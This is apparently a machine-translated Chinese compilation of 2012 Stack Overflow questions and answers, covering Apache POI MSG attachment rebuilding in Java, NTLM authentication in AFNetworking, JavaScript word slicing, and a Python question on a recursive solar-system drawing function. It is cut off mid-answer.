            MAPIType type = val.getActualType();
            if (type != null && type != Types.UNKNOWN) {
                topLevelChunk.setProperty(val);
            }
        }
    }
    // Create nameid entries.
    DirectoryEntry nameid = newDoc.getRoot().createDirectory(NameIdChunks.NAME);
    // GUID stream
    nameid.createDocument(PropertiesChunk.DEFAULT_NAME_PREFIX + "00020102", new ByteArrayInputStream(new byte[0]));
    // Entry stream
    nameid.createDocument(PropertiesChunk.DEFAULT_NAME_PREFIX + "00030102", new ByteArrayInputStream(new byte[0]));
    // String stream
    nameid.createDocument(PropertiesChunk.DEFAULT_NAME_PREFIX + "00040102", new ByteArrayInputStream(new byte[0]));
    // Base properties.
    // Attachment/Recipient counter.
    topLevelChunk.setAttachmentCount(attachmentscount);
    topLevelChunk.setRecipientCount(recipientscount);
    topLevelChunk.setNextAttachmentId(attachmentscount);
    topLevelChunk.setNextRecipientId(recipientscount);
    // Unicode string format.
    byte[] storeSupportMaskData = new byte[4];
    PropertyValue.LongPropertyValue storeSupportPropertyValue = new PropertyValue.LongPropertyValue(MAPIProperty.STORE_SUPPORT_MASK,
            MessagePropertiesChunk.PROPERTIES_FLAG_READABLE | MessagePropertiesChunk.PROPERTIES_FLAG_WRITEABLE,
            storeSupportMaskData);
    storeSupportPropertyValue.setValue(0x00040000);
    topLevelChunk.setProperty(storeSupportPropertyValue);
    topLevelChunk.setProperty(new PropertyValue(MAPIProperty.HASATTACH,
            MessagePropertiesChunk.PROPERTIES_FLAG_READABLE | MessagePropertiesChunk.PROPERTIES_FLAG_WRITEABLE,
            attachmentscount == 0 ? new byte[] { 0 } : new byte[] { 1 }));
    // Copy properties from MSG file system.
    for (Chunk chunk : attachedMsg.getMainChunks().getChunks()) {
        if (!(chunk instanceof MessagePropertiesChunk)) {
            String entryName = chunk.getEntryName();
            String entryType = entryName.substring(entryName.length() - 4);
            int iType = Integer.parseInt(entryType, 16);
            MAPIType type = Types.getById(iType);
            if (type != null && type != Types.UNKNOWN) {
                MAPIProperty mprop = MAPIProperty.createCustom(chunk.getChunkId(), type, chunk.getEntryName());
                ByteArrayOutputStream data = new ByteArrayOutputStream();
                chunk.writeValue(data);
                PropertyValue pval = new PropertyValue(mprop, MessagePropertiesChunk.PROPERTIES_FLAG_READABLE
                        | MessagePropertiesChunk.PROPERTIES_FLAG_WRITEABLE, data.toByteArray(), type);
                topLevelChunk.setProperty(pval);
            }
        }
    }
    topLevelChunk.writeProperties(newDoc.getRoot());
    return newDoc;
} 
```

重建附加的味精

```
 try (POIFSFileSystem extractedAttachedMsg = rebuildFromAttached(attachedMsg)) {
                try (ByteArrayOutputStream extractedAttachedMsgOut = new ByteArrayOutputStream()) {
                    extractedAttachedMsg.writeFilesystem(extractedAttachedMsgOut);
                    byte[] extratedAttachedMsgRaw = extractedAttachedMsgOut.toByteArray();
                    // this byte array can be persisted to disk and opened in MS Outlook
                }
            } 
```

问候， 多米尼克

# ios - AFNetworking 是否支持 NTLM 身份验证？

> ID：13548448
> 
> 赞同：5
> 
> 时间：2012-11-25T05:01:16.930
> 
> 标签：ios, afnetworking, ntlm

AFNetworking 是否支持 NTLM 身份验证？

我知道 ASIHTTPRequest 可以做到，我正在尝试迁移到 AFNetworking，但我必须确保它能够处理它。

我真的在互联网上搜索过这个，但我无法找到这个确切的答案。

谢谢你们。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-10T14:08:55.383

是的，AFNetworking 确实支持 NTLM 身份验证（或基本上任何身份验证方法），通常通过对身份验证挑战提供基于块的响应。

这是一个代码示例（假设`operation`是 a`AFHTTPRequestOperation`等`AFJSONRequestOperation`）。在开始操作之前，像这样设置身份验证挑战块：

```
[operation setAuthenticationChallengeBlock:
 ^( NSURLConnection* connection, NSURLAuthenticationChallenge* challenge )
{
   if( [[challenge protectionSpace] authenticationMethod] == NSURLAuthenticationMethodNTLM )
   {
      if( [challenge previousFailureCount] > 0 )
      {
         // Avoid too many failed authentication attempts which could lock out the user
         [[challenge sender] cancelAuthenticationChallenge:challenge];
      }
      else
      {
         [[challenge sender] useCredential:[NSURLCredential credentialWithUser:@"username" password:@"password" persistence:NSURLCredentialPersistenceForSession] forAuthenticationChallenge:challenge];
      }
   }
   else
   {
      // Authenticate in other ways than NTLM if desired or cancel the auth like this:
      [[challenge sender] cancelAuthenticationChallenge:challenge];
   }
}]; 
```

像往常一样启动或排队操作，这应该可以解决问题。

这基本上就是 Wayne Hartman[在他的博客中描述的](http://blog.waynehartman.com/articles/how-to-do-ntlm-authentication-in-ios.aspx)应用于 AFNetworking 的方法。

# javascript - Javascript：如何从 index1 到 index2 中提取单词？

> ID：13548450
> 
> 赞同：0
> 
> 时间：2012-11-25T05:01:52.923
> 
> 标签：javascript, regex

我有一个文本，我需要从 index1 到 index2 中提取单词。

`"This is a text from where a part should be extracted"`

索引1 = 3，索引2 = 7

`result = "text from where a "`

考虑到单词可能用多个空格分隔，如何使用 regExp 执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:07:35.323

我给你一个提示。

```
"This is a text from where a part should be extracted"
    .match(/[^\s]+\s*/g)
    .slice(3, 7)
    .join(''); 
```

你应该能够很容易地将它变成一个通用函数。

干杯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:45:25.433

```
"This is a text from  where a part should be extracted"
.split(/\s+/).slice(4,8).join(" "); 
```

此版本删除了多余的空格。

# python - 如何使函数递归

> ID：13548451
> 
> 赞同：-1
> 
> 时间：2012-11-25T05:01:58.927
> 
> 标签：python, function, recursion, python-3.x

我有这个巨大的功能，我想知道如何使它递归。我有一个永远不应该实现的基本情况，所以它应该总是去 else 并继续用变量 t 增加来调用自己。任何帮助都会非常感谢

```
 def draw(x, y, t, planets):
    if 'Satellites' in planets["Moon"]:
        print ("fillcircle", x, y, planets["Moon"]['Radius']*scale)
    else:
            print("refresh")
            print("colour 0 0 0")
            print("clear")
            print("colour 255 255 255")
            print("fillcircle",x,y,planets['Sun']['Radius']*scale)
            print("text ", "\"Sun\"",x+planets['Sun']['Radius']*scale,y)
            if "Mercury" in planets:
                r_Mercury=planets['Mercury']['Orbital Radius']*scale;
                print("circle",x,y,r_Mercury)
                r_Xmer=x+math.sin(t*2*math.pi/planets['Mercury']['Period'])*r_Mercury
                r_Ymer=y+math.cos(t*2*math.pi/planets['Mercury']['Period'])*r_Mercury
                print("fillcircle",r_Xmer,r_Ymer,3)
                print("text ", "\"Mercury\"",r_Xmer+planets['Mercury']['Radius']*scale,r_Ymer)
            if "Venus" in planets:
                r_Venus=planets['Venus']['Orbital Radius']*scale;
                print("circle",x,y,r_Venus)
                r_Xven=x+math.sin(t*2*math.pi/planets['Venus']['Period'])*r_Venus
                r_Yven=y+math.cos(t*2*math.pi/planets['Venus']['Period'])*r_Venus
                print("fillcircle",r_Xven,r_Yven,3)
                print("text ", "\"Venus\"",r_Xven+planets['Venus']['Radius']*scale,r_Yven)
            if "Earth" in planets:
                r_Earth=planets['Earth']['Orbital Radius']*scale;
                print("circle",x,y,r_Earth)
                r_Xe=x+math.sin(t*2*math.pi/planets['Earth']['Period'])*r_Earth
                r_Ye=y+math.cos(t*2*math.pi/planets['Earth']['Period'])*r_Earth
                print("fillcircle",r_Xe,r_Ye,3)
                print("text ", "\"Earth\"",r_Xe+planets['Earth']['Radius']*scale,r_Ye)
            if "Moon" in planets:
                r_Moon=planets['Moon']['Orbital Radius']*scale;
                print("circle",r_Xe,r_Ye,r_Moon)
                r_Xm=r_Xe+math.sin(t*2*math.pi/planets['Moon']['Period'])*r_Moon
                r_Ym=r_Ye+math.cos(t*2*math.pi/planets['Moon']['Period'])*r_Moon
                print("fillcircle",r_Xm,r_Ym,3)
                print("text ", "\"Moon\"",r_Xm+planets['Moon']['Radius']*scale,r_Ym)
            if "Mars" in planets:
                r_Mars=planets['Mars']['Orbital Radius']*scale;
                print("circle",x,y,r_Mars)
                r_Xmar=x+math.sin(t*2*math.pi/planets['Mars']['Period'])*r_Mars
                r_Ymar=y+math.cos(t*2*math.pi/planets['Mars']['Period'])*r_Mars
                print("fillcircle",r_Xmar,r_Ymar,3)
                print("text ", "\"Mars\"",r_Xmar+planets['Mars']['Radius']*scale,r_Ymar)
            if "Phobos" in planets:
                r_Phobos=planets['Phobos']['Orbital Radius']*scale;
                print("circle",r_Xmar,r_Ymar,r_Phobos)
                r_Xpho=r_Xmar+math.sin(t*2*math.pi/planets['Phobos']['Period'])*r_Phobos
                r_Ypho=r_Ymar+math.cos(t*2*math.pi/planets['Phobos']['Period'])*r_Phobos
                print("fillcircle",r_Xpho,r_Ypho,3)
                print("text ", "\"Phobos\"",r_Xpho+planets['Phobos']['Radius']*scale,r_Ypho)
            if "Deimos" in planets:
                r_Deimos=planets['Deimos']['Orbital Radius']*scale;
                print("circle",r_Xmar,r_Ymar,r_Deimos)
                r_Xdei=r_Xmar+math.sin(t*2*math.pi/planets['Deimos']['Period'])*r_Deimos
                r_Ydei=r_Ymar+math.cos(t*2*math.pi/planets['Deimos']['Period'])*r_Deimos
                print("fillcircle",r_Xdei,r_Ydei,3)
                print("text ", "\"Deimos\"",r_Xpho+planets['Deimos']['Radius']*scale,r_Ydei)
            if "Ceres" in planets:
                r_Ceres=planets['Ceres']['Orbital Radius']*scale;
                print("circle",x,y,r_Ceres)
                r_Xcer=x+math.sin(t*2*math.pi/planets['Ceres']['Period'])*r_Ceres
                r_Ycer=y+math.cos(t*2*math.pi/planets['Ceres']['Period'])*r_Ceres
                print("fillcircle",r_Xcer,r_Ycer,3)
                print("text ", "\"Ceres\"",r_Xcer+planets['Ceres']['Radius']*scale,r_Ycer)
            if "Jupiter" in planets:
                r_Jupiter=planets['Jupiter']['Orbital Radius']*scale;
                print("circle",x,y,r_Jupiter)
                r_Xjup=x+math.sin(t*2*math.pi/planets['Jupiter']['Period'])*r_Jupiter
                r_Yjup=y+math.cos(t*2*math.pi/planets['Jupiter']['Period'])*r_Jupiter
                print("fillcircle",r_Xjup,r_Yjup,3)
                print("text ", "\"Jupiter\"",r_Xjup+planets['Jupiter']['Radius']*scale,r_Yjup)
            if "Io" in planets:
                r_Io=planets['Io']['Orbital Radius']*scale;
                print("circle",r_Xjup,r_Yjup,r_Io)
                r_Xio=r_Xjup+math.sin(t*2*math.pi/planets['Io']['Period'])*r_Io
                r_Yio=r_Yjup+math.cos(t*2*math.pi/planets['Io']['Period'])*r_Io
                print("fillcircle",r_Xio,r_Yio,3)
                print("text ", "\"Io\"",r_Xio+planets['Io']['Radius']*scale,r_Yio)
            if "Europa" in planets:
                r_Europa=planets['Europa']['Orbital Radius']*scale;
                print("circle",r_Xjup,r_Yjup,r_Europa)
                r_Xeur=r_Xjup+math.sin(t*2*math.pi/planets['Europa']['Period'])*r_Europa
                r_Yeur=r_Yjup+math.cos(t*2*math.pi/planets['Europa']['Period'])*r_Europa
                print("fillcircle",r_Xeur,r_Yeur,3)
                print("text ", "\"Europa\"",r_Xeur+planets['Europa']['Radius']*scale,r_Yeur)
            if "Ganymede" in planets:
                r_Ganymede=planets['Ganymede']['Orbital Radius']*scale;
                print("circle",r_Xjup,r_Yjup,r_Ganymede)
                r_Xgan=r_Xjup+math.sin(t*2*math.pi/planets['Ganymede']['Period'])*r_Ganymede
                r_Ygan=r_Yjup+math.cos(t*2*math.pi/planets['Ganymede']['Period'])*r_Ganymede
                print("fillcircle",r_Xgan,r_Ygan,3)
                print("text ", "\"Ganymede\"",r_Xgan+planets['Ganymede']['Radius']*scale,r_Ygan)
            if "Callisto" in planets:
                r_Callisto=planets['Callisto']['Orbital Radius']*scale;
                print("circle",r_Xjup,r_Yjup,r_Callisto)
                r_Xcal=r_Xjup+math.sin(t*2*math.pi/planets['Callisto']['Period'])*r_Callisto
                r_Ycal=r_Yjup+math.cos(t*2*math.pi/planets['Callisto']['Period'])*r_Callisto
                print("fillcircle",r_Xcal,r_Ycal,3)
                print("text ", "\"Callisto\"",r_Xcal+planets['Callisto']['Radius']*scale,r_Ycal)
            if "Saturn" in planets:
                r_Saturn=planets['Saturn']['Orbital Radius']*scale;
                print("circle",x,y,r_Saturn)
                r_Xsat=x+math.sin(t*2*math.pi/planets['Saturn']['Period'])*r_Saturn
                r_Ysat=y+math.cos(t*2*math.pi/planets['Saturn']['Period'])*r_Saturn
                print("fillcircle",r_Xsat,r_Ysat,3)
                print("text ", "\"Saturn\"",r_Xsat+planets['Saturn']['Radius']*scale,r_Ysat)
            if "Mimas" in planets:
                r_Mimas=planets['Mimas']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Mimas)
                r_Xmim=r_Xsat+math.sin(t*2*math.pi/planets['Mimas']['Period'])*r_Mimas
                r_Ymim=r_Ysat+math.cos(t*2*math.pi/planets['Mimas']['Period'])*r_Mimas
                print("fillcircle",r_Xmim,r_Ymim,3)
                print("text ", "\"Mimas\"",r_Xmim+planets['Mimas']['Radius']*scale,r_Ymim)
            if "Enceladus" in planets:
                r_Enceladus=planets['Enceladus']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Enceladus)
                r_Xenc=r_Xsat+math.sin(t*2*math.pi/planets['Enceladus']['Period'])*r_Enceladus
                r_Yenc=r_Ysat+math.cos(t*2*math.pi/planets['Enceladus']['Period'])*r_Enceladus
                print("fillcircle",r_Xenc,r_Yenc,3)
                print("text ", "\"Enceladus\"",r_Xenc+planets['Enceladus']['Radius']*scale,r_Yenc)
            if "Tethys" in planets:
                r_Tethys=planets['Tethys']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Tethys)
                r_Xtet=r_Xsat+math.sin(t*2*math.pi/planets['Tethys']['Period'])*r_Tethys
                r_Ytet=r_Ysat+math.cos(t*2*math.pi/planets['Tethys']['Period'])*r_Tethys
                print("fillcircle",r_Xtet,r_Ytet,3)
                print("text ", "\"Tethys\"",r_Xtet+planets['Tethys']['Radius']*scale,r_Ytet)
            if "Dione" in planets:
                r_Dione=planets['Dione']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Dione)
                r_Xdio=r_Xsat+math.sin(t*2*math.pi/planets['Dione']['Period'])*r_Dione
                r_Ydio=r_Ysat+math.cos(t*2*math.pi/planets['Dione']['Period'])*r_Dione
                print("fillcircle",r_Xdio,r_Ydio,3)
                print("text ", "\"Dione\"",r_Xdio+planets['Dione']['Radius']*scale,r_Ydio)
            if "Rhea" in planets:
                r_Rhea=planets['Rhea']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Rhea)
                r_Xrhe=r_Xsat+math.sin(t*2*math.pi/planets['Rhea']['Period'])*r_Rhea
                r_Yrhe=r_Ysat+math.cos(t*2*math.pi/planets['Rhea']['Period'])*r_Rhea
                print("fillcircle",r_Xrhe,r_Yrhe,3)
                print("text ", "\"Rhea\"",r_Xrhe+planets['Rhea']['Radius']*scale,r_Yrhe)
            if "Titan" in planets:
                r_Titan=planets['Titan']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Titan)
                r_Xtit=r_Xsat+math.sin(t*2*math.pi/planets['Titan']['Period'])*r_Titan
                r_Ytit=r_Ysat+math.cos(t*2*math.pi/planets['Titan']['Period'])*r_Titan
                print("fillcircle",r_Xtit,r_Ytit,3)
                print("text ", "\"Titan\"",r_Xtit+planets['Titan']['Radius']*scale,r_Ytit)
            if "Iapetus" in planets:
                r_Iapetus=planets['Iapetus']['Orbital Radius']*scale;
                print("circle",r_Xsat,r_Ysat,r_Iapetus)
                r_Xiap=r_Xsat+math.sin(t*2*math.pi/planets['Iapetus']['Period'])*r_Iapetus
                r_Yiap=r_Ysat+math.cos(t*2*math.pi/planets['Iapetus']['Period'])*r_Iapetus
                print("fillcircle",r_Xiap,r_Yiap,3)
                print("text ", "\"Iapetus\"",r_Xiap+planets['Iapetus']['Radius']*scale,r_Yiap)
            if "Uranus" in planets:
                r_Uranus=planets['Uranus']['Orbital Radius']*scale;
                print("circle",x,y,r_Uranus)
                r_Xura=x+math.sin(t*2*math.pi/planets['Uranus']['Period'])*r_Uranus
                r_Yura=y+math.cos(t*2*math.pi/planets['Uranus']['Period'])*r_Uranus
                print("fillcircle",r_Xura,r_Yura,3)
                print("text ", "\"Uranus\"",r_Xura+planets['Uranus']['Radius']*scale,r_Yura)
            if "Puck" in planets:
                r_Puck=planets['Puck']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Puck)
                r_Xpuc=r_Xura+math.sin(t*2*math.pi/planets['Puck']['Period'])*r_Puck
                r_Ypuc=r_Yura+math.cos(t*2*math.pi/planets['Puck']['Period'])*r_Puck
                print("fillcircle",r_Xpuc,r_Ypuc,3)
                print("text ", "\"Puck\"",r_Xpuc+planets['Puck']['Radius']*scale,r_Ypuc)
            if "Miranda" in planets:
                r_Miranda=planets['Miranda']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Miranda)
                r_Xmira=r_Xura+math.sin(t*2*math.pi/planets['Miranda']['Period'])*r_Miranda
                r_Ymira=r_Yura+math.cos(t*2*math.pi/planets['Miranda']['Period'])*r_Miranda
                print("fillcircle",r_Xmira,r_Ymira,3)
                print("text ", "\"Miranda\"",r_Xmira+planets['Miranda']['Radius']*scale,r_Ymira)
            if "Ariel" in planets:
                r_Ariel=planets['Ariel']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Ariel)
                r_Xari=r_Xura+math.sin(t*2*math.pi/planets['Ariel']['Period'])*r_Ariel
                r_Yari=r_Yura+math.cos(t*2*math.pi/planets['Ariel']['Period'])*r_Ariel
                print("fillcircle",r_Xari,r_Yari,3)
                print("text ", "\"Ariel\"",r_Xari+planets['Ariel']['Radius']*scale,r_Yari)
            if "Umbriel" in planets:
                r_Umbriel=planets['Umbriel']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Umbriel)
                r_Xumb=r_Xura+math.sin(t*2*math.pi/planets['Umbriel']['Period'])*r_Umbriel
                r_Yumb=r_Yura+math.cos(t*2*math.pi/planets['Umbriel']['Period'])*r_Umbriel
                print("fillcircle",r_Xumb,r_Yumb,3)
                print("text ", "\"Umbriel\"",r_Xumb+planets['Umbriel']['Radius']*scale,r_Yumb)
            if "Titania" in planets:
                r_Titania=planets['Titania']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Titania)
                r_Xtita=r_Xura+math.sin(t*2*math.pi/planets['Titania']['Period'])*r_Titania
                r_Ytita=r_Yura+math.cos(t*2*math.pi/planets['Titania']['Period'])*r_Titania
                print("fillcircle",r_Xtita,r_Ytita,3)
                print("text ", "\"Titania\"",r_Xtita+planets['Titania']['Radius']*scale,r_Ytita)
            if "Oberon" in planets:
                r_Oberon=planets['Oberon']['Orbital Radius']*scale;
                print("circle",r_Xura,r_Yura,r_Oberon)
                r_Xober=r_Xura+math.sin(t*2*math.pi/planets['Oberon']['Period'])*r_Oberon
                r_Yober=r_Yura+math.cos(t*2*math.pi/planets['Oberon']['Period'])*r_Oberon
                print("fillcircle",r_Xober,r_Yober,3)
                print("text ", "\"Oberon\"",r_Xober+planets['Oberon']['Radius']*scale,r_Yober)
            if "Neptune" in planets:
                r_Neptune=planets['Neptune']['Orbital Radius']*scale;
                print("circle",x,y,r_Neptune)
                r_Xnep=x+math.sin(t*2*math.pi/planets['Neptune']['Period'])*r_Neptune
                r_Ynep=y+math.cos(t*2*math.pi/planets['Neptune']['Period'])*r_Neptune
                print("fillcircle",r_Xnep,r_Ynep,3)
                print("text ", "\"Neptune\"",r_Xnep+planets['Neptune']['Radius']*scale,r_Ynep)
            if "Titan" in planets:
                r_Titan=planets['Titan']['Orbital Radius']*scale;
                print("circle",r_Xnep,r_Ynep,r_Titan)
                r_Xtita=r_Xnep+math.sin(t*2*math.pi/planets['Titan']['Period'])*r_Titan
                r_Ytita=r_Ynep+math.cos(t*2*math.pi/planets['Titan']['Period'])*r_Titan
                print("fillcircle",r_Xtita,r_Ytita,3)
                print("text ", "\"Titan\"",r_Xtita+planets['Titan']['Radius']*scale,r_Ytita)

            t += 0.003
            draw(x, y, t, planets)
def draw(x, y, t, planets):
    if 'Satellites' in planets["Moon"]:
        print ("fillcircle", x, y, planets["Moon"]['Radius']*scale)
    else:
        print("refresh")
        print("colour 0 0 0")
        print("clear")
        print("colour 255 255 255")
        print("fillcircle",x,y,planets['Sun']['Radius']*scale)
        print("text ", "\"Sun\"",x+planets['Sun']['Radius']*scale,y)

        for each in planets.keys():
                r_planet=planets[each]['Orbital Radius']*scale;
                print("circle", x, y, r_planet)
                #if "Period" in planets[each]:
                    #r_X = x+math.sin(t*2*math.pi/planets[each]['Period'])*r_planet
                    #r_Y = y+math.cos(t*2*math.pi/planets[each]['Period'])*r_planet
                    #print("fillcircle",r_X,r_Y,3)
                    #print("text ", each, r_X+planets[each]['Radius']*scale,r_Y)
                    #t += 0.003

print(draw(x, y, t, planets)) 
```

我将绘图修剪到上面它计算圆圈的位置但不在quickdraw中打印它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:12:06.473

如果您确实希望基本案例失败，那么您的函数需要再次调用您的函数：

```
def draw(x, y, t, planets):
    if 'Satellites' in planets["Moon"]:
        print ("fillcircle", x, y, planets["Moon"]['Radius']*scale)
    else:
        print("refresh")
        print("colour 0 0 0")
        print("clear")
        print("colour 255 255 255")
        print("fillcircle",x,y,planets['Sun']['Radius']*scale)
        print("text ", "\"Sun\"",x+planets['Sun']['Radius']*scale,y)
        if "Mercury" in planets:
            r_Mercury=planets['Mercury']['Orbital Radius']*scale;
            print("circle",x,y,r_Mercury)
            r_Xmer=x+math.sin(t*2*math.pi/planets['Mercury']['Period'])*r_Mercury
            r_Ymer=y+math.cos(t*2*math.pi/planets['Mercury']['Period'])*r_Mercury
            print("fillcircle",r_Xmer,r_Ymer,3)
            print("text ", "\"Mercury\"",r_Xmer+planets['Mercury']['Radius']*scale,r_Ymer)
        if "Venus" in planets:
            r_Venus=planets['Venus']['Orbital Radius']*scale;
            print("circle",x,y,r_Venus)
            r_Xven=x+math.sin(t*2*math.pi/planets['Venus']['Period'])*r_Venus
            r_Yven=y+math.cos(t*2*math.pi/planets['Venus']['Period'])*r_Venus
            print("fillcircle",r_Xven,r_Yven,3)
            print("text ", "\"Venus\"",r_Xven+planets['Venus']['Radius']*scale,r_Yven)
        if "Earth" in planets:
            r_Earth=planets['Earth']['Orbital Radius']*scale;
            print("circle",x,y,r_Earth)
            r_Xe=x+math.sin(t*2*math.pi/planets['Earth']['Period'])*r_Earth
            r_Ye=y+math.cos(t*2*math.pi/planets['Earth']['Period'])*r_Earth
            print("fillcircle",r_Xe,r_Ye,3)
            print("text ", "\"Earth\"",r_Xe+planets['Earth']['Radius']*scale,r_Ye)
        if "Moon" in planets:
            r_Moon=planets['Moon']['Orbital Radius']*scale;
            print("circle",r_Xe,r_Ye,r_Moon)
            r_Xm=r_Xe+math.sin(t*2*math.pi/planets['Moon']['Period'])*r_Moon
            r_Ym=r_Ye+math.cos(t*2*math.pi/planets['Moon']['Period'])*r_Moon
            print("fillcircle",r_Xm,r_Ym,3)
            print("text ", "\"Moon\"",r_Xm+planets['Moon']['Radius']*scale,r_Ym)
        if "Mars" in planets:
            r_Mars=planets['Mars']['Orbital Radius']*scale;
            print("circle",x,y,r_Mars)
            r_Xmar=x+math.sin(t*2*math.pi/planets['Mars']['Period'])*r_Mars
            r_Ymar=y+math.cos(t*2*math.pi/planets['Mars']['Period'])*r_Mars
            print("fillcircle",r_Xmar,r_Ymar,3)
            print("text ", "\"Mars\"",r_Xmar+planets['Mars']['Radius']*scale,r_Ymar)
        if "Phobos" in planets:
            r_Phobos=planets['Phobos']['Orbital Radius']*scale;
            print("circle",r_Xmar,r_Ymar,r_Phobos)
            r_Xpho=r_Xmar+math.sin(t*2*math.pi/planets['Phobos']['Period'])*r_Phobos
            r_Ypho=r_Ymar+math.cos(t*2*math.pi/planets['Phobos']['Period'])*r_Phobos
            print("fillcircle",r_Xpho,r_Ypho,3)
            print("text ", "\"Phobos\"",r_Xpho+planets['Phobos']['Radius']*scale,r_Ypho)
        if "Deimos" in planets:
            r_Deimos=planets['Deimos']['Orbital Radius']*scale;
            print("circle",r_Xmar,r_Ymar,r_Deimos)
            r_Xdei=r_Xmar+math.sin(t*2*math.pi/planets['Deimos']['Period'])*r_Deimos
            r_Ydei=r_Ymar+math.cos(t*2*math.pi/planets['Deimos']['Period'])*r_Deimos
            print("fillcircle",r_Xdei,r_Ydei,3)
            print("text ", "\"Deimos\"",r_Xpho+planets['Deimos']['Radius']*scale,r_Ydei)
        if "Ceres" in planets:
            r_Ceres=planets['Ceres']['Orbital Radius']*scale;
            print("circle",x,y,r_Ceres)
            r_Xcer=x+math.sin(t*2*math.pi/planets['Ceres']['Period'])*r_Ceres
            r_Ycer=y+math.cos(t*2*math.pi/planets['Ceres']['Period'])*r_Ceres
            print("fillcircle",r_Xcer,r_Ycer,3)
            print("text ", "\"Ceres\"",r_Xcer+planets['Ceres']['Radius']*scale,r_Ycer)
        if "Jupiter" in planets:
            r_Jupiter=planets['Jupiter']['Orbital Radius']*scale;
            print("circle",x,y,r_Jupiter)
            r_Xjup=x+math.sin(t*2*math.pi/planets['Jupiter']['Period'])*r_Jupiter
            r_Yjup=y+math.cos(t*2*math.pi/planets['Jupiter']['Period'])*r_Jupiter
            print("fillcircle",r_Xjup,r_Yjup,3)
            print("text ", "\"Jupiter\"",r_Xjup+planets['Jupiter']['Radius']*scale,r_Yjup)
        if "Io" in planets:
            r_Io=planets['Io']['Orbital Radius']*scale;
            print("circle",r_Xjup,r_Yjup,r_Io)
            r_Xio=r_Xjup+math.sin(t*2*math.pi/planets['Io']['Period'])*r_Io
            r_Yio=r_Yjup+math.cos(t*2*math.pi/planets['Io']['Period'])*r_Io
            print("fillcircle",r_Xio,r_Yio,3)
            print("text ", "\"Io\"",r_Xio+planets['Io']['Radius']*scale,r_Yio)
        if "Europa" in planets:
            r_Europa=planets['Europa']['Orbital Radius']*scale;
            print("circle",r_Xjup,r_Yjup,r_Europa)
            r_Xeur=r_Xjup+math.sin(t*2*math.pi/planets['Europa']['Period'])*r_Europa
            r_Yeur=r_Yjup+math.cos(t*2*math.pi/planets['Europa']['Period'])*r_Europa
            print("fillcircle",r_Xeur,r_Yeur,3)
            print("text ", "\"Europa\"",r_Xeur+planets['Europa']['Radius']*scale,r_Yeur)
        if "Ganymede" in planets:
            r_Ganymede=planets['Ganymede']['Orbital Radius']*scale;
            print("circle",r_Xjup,r_Yjup,r_Ganymede)
            r_Xgan=r_Xjup+math.sin(t*2*math.pi/planets['Ganymede']['Period'])*r_Ganymede
            r_Ygan=r_Yjup+math.cos(t*2*math.pi/planets['Ganymede']['Period'])*r_Ganymede
            print("fillcircle",r_Xgan,r_Ygan,3)
            print("text ", "\"Ganymede\"",r_Xgan+planets['Ganymede']['Radius']*scale,r_Ygan)
        if "Callisto" in planets:
            r_Callisto=planets['Callisto']['Orbital Radius']*scale;
            print("circle",r_Xjup,r_Yjup,r_Callisto)
            r_Xcal=r_Xjup+math.sin(t*2*math.pi/planets['Callisto']['Period'])*r_Callisto
            r_Ycal=r_Yjup+math.cos(t*2*math.pi/planets['Callisto']['Period'])*r_Callisto
            print("fillcircle",r_Xcal,r_Ycal,3)
            print("text ", "\"Callisto\"",r_Xcal+planets['Callisto']['Radius']*scale,r_Ycal)
        if "Saturn" in planets:
            r_Saturn=planets['Saturn']['Orbital Radius']*scale;
            print("circle",x,y,r_Saturn)
            r_Xsat=x+math.sin(t*2*math.pi/planets['Saturn']['Period'])*r_Saturn
            r_Ysat=y+math.cos(t*2*math.pi/planets['Saturn']['Period'])*r_Saturn
            print("fillcircle",r_Xsat,r_Ysat,3)
            print("text ", "\"Saturn\"",r_Xsat+planets['Saturn']['Radius']*scale,r_Ysat)
        if "Mimas" in planets:
            r_Mimas=planets['Mimas']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Mimas)
            r_Xmim=r_Xsat+math.sin(t*2*math.pi/planets['Mimas']['Period'])*r_Mimas
            r_Ymim=r_Ysat+math.cos(t*2*math.pi/planets['Mimas']['Period'])*r_Mimas
            print("fillcircle",r_Xmim,r_Ymim,3)
            print("text ", "\"Mimas\"",r_Xmim+planets['Mimas']['Radius']*scale,r_Ymim)
        if "Enceladus" in planets:
            r_Enceladus=planets['Enceladus']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Enceladus)
            r_Xenc=r_Xsat+math.sin(t*2*math.pi/planets['Enceladus']['Period'])*r_Enceladus
            r_Yenc=r_Ysat+math.cos(t*2*math.pi/planets['Enceladus']['Period'])*r_Enceladus
            print("fillcircle",r_Xenc,r_Yenc,3)
            print("text ", "\"Enceladus\"",r_Xenc+planets['Enceladus']['Radius']*scale,r_Yenc)
        if "Tethys" in planets:
            r_Tethys=planets['Tethys']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Tethys)
            r_Xtet=r_Xsat+math.sin(t*2*math.pi/planets['Tethys']['Period'])*r_Tethys
            r_Ytet=r_Ysat+math.cos(t*2*math.pi/planets['Tethys']['Period'])*r_Tethys
            print("fillcircle",r_Xtet,r_Ytet,3)
            print("text ", "\"Tethys\"",r_Xtet+planets['Tethys']['Radius']*scale,r_Ytet)
        if "Dione" in planets:
            r_Dione=planets['Dione']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Dione)
            r_Xdio=r_Xsat+math.sin(t*2*math.pi/planets['Dione']['Period'])*r_Dione
            r_Ydio=r_Ysat+math.cos(t*2*math.pi/planets['Dione']['Period'])*r_Dione
            print("fillcircle",r_Xdio,r_Ydio,3)
